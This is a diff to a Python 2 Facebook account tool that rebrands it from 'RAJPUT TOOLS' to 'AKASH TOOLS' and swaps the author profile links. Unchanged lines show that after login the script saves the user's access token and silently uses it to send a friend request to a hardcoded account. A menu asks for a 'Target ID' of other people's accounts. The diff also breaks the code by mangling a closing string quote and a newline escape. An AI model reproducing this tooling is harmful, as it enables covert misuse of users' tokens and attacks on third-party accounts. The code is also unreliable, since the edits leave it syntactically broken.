@@ -39,22 +39,21 @@ def jalan(z):
 		
 ##### LOGO #####
 logo = """
-🔷❤💓❤💓❤💓❤🔷                   
+🔷💓💓🔷                   
+ _____  _     ____  _      ____  ____ 
+/__ __\/ \ /|/  _ \/ \  /|/  _ \/  _ \
+  / \  | |_||| / \|| |\ ||| | \|| / \|
+  | |  | | ||| |-||| | \||| |_/|| |-||
+  \_/  \_/ \|\_/ \|\_/  \|\____/\_/ \|
 
-█████╗██╗  ██╗..  █████╗    ███╗      ██  ╗██████╗ . ...  ████╗ 
-═██╔═╝██║  ██║██╔══██╗████ ╗  ██║  ██.   ══██╗██╔══██╗
-   ██║   ███████║███████║██╔██╗ ██║██ .    ║   ██║███████║
-   ██║   ██╔══██║██╔══██║██║╚██╗██ ██..   ║  ██║██╔══██║
-   ██║    ██║     ██║██║      ██    ║██║ ╚████║██████╔╝██║.   ██║
-   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝ 
-
-██████╗     █████╗   ██████╗     █████╗ 
-██╔══██╗██╔══██╗██╔══██╗██╔══██╗
-██████╔╝███████║██████╔╝███████║
-██╔══██╗██╔══██║██╔══██╗██╔══ ██║
-██████╔╝██║      ██   ██████╔╝██║      ██║
-╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
-"""
+  ____          ____          
+ |  _ \   /\   |  _ \   /\    
+ | |_) | /  \  | |_) | /  \   
+ |  _ < / /\ \ |  _ < / /\ \  
+ | |_) / ____ \| |_) / ____ \ 
+ |____/_/    \_\____/_/    \_\
+                              
+""
 # titik #
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -147,7 +146,7 @@ def login():
 				zedd.write(z['access_token'])
 				zedd.close()
 				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
-				os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
+				os.system('xdg-open https://www.facebook.com/Thanda.babaa')
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -180,7 +179,7 @@ def tokenz():
 	except KeyError:
 		print "\033[1;91m[!] Wrong"
 		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
-		os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
+		os.system('xdg-open https://www.facebook.com/Thanda.babaa')
 		if e =="":
 			keluar()
 		elif e =="y":
@@ -215,7 +214,7 @@ def menu():
 		keluar()
 	os.system("reset")
 	print logo
-	print "\033[1;92m 🔷❤💓❤RAJPUT TOOLS❤💓❤🔷"
+	print "\033[1;92m 🔷AKASH TOOLS🔷"
 	print
 	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
 	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
@@ -266,7 +265,7 @@ def pilih():
 		os.remove('out')
 	elif zedd =="9":
 		os.system('rm -rf login.txt')
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100063500874736')
+		os.system('xdg-open https://www.facebook.com/Thanda.babaa')
 		keluar()
 	elif zedd =="0":
 		keluar()
@@ -975,7 +974,7 @@ def mini():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
+	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\number with your account first!"
 	print 42*"\033[1;97m═"
 	try:
 		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
